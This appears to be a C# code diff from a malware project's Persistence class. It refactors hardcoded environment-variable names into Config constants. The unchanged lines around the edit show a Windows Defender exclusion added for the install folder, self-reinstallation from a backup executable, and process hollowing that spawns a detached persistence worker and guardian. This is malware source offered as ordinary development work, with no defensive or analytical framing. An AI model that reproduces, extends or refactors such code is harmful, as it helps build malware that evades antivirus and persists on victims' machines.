@@ -569,7 +569,7 @@ internal static partial class Persistence
             {
                 Directory.CreateDirectory(Path.GetDirectoryName(installExe)!);
                 Protection.AddDefenderExclusion(Path.GetDirectoryName(installExe)!);
-                var seroExe = Environment.GetEnvironmentVariable("SERO_EXE");
+                var seroExe = Environment.GetEnvironmentVariable(Config.EnvKeyExe);
                 if (File.Exists(backupExe))
                     File.Copy(backupExe, installExe, true);
                 else if (!string.IsNullOrEmpty(seroExe) && File.Exists(seroExe))
@@ -618,9 +618,9 @@ internal static partial class Persistence
             if (!string.IsNullOrEmpty(exePath))
                 ProcessHollowing.SpawnDetached(exePath, new Dictionary<string, string?>
                 {
-                    ["SERO_PERSIST_WORKER"]           = "1",
+                    [Config.EnvKeyPersistWorker]      = "1",
                     [ProcessHollowing.HOLLOW_ENV_KEY] = null,
-                    ["SERO_GUARDIAN"]                 = null,
+                    [Config.EnvKeyGuardian]           = null,
                 });
         }
     }
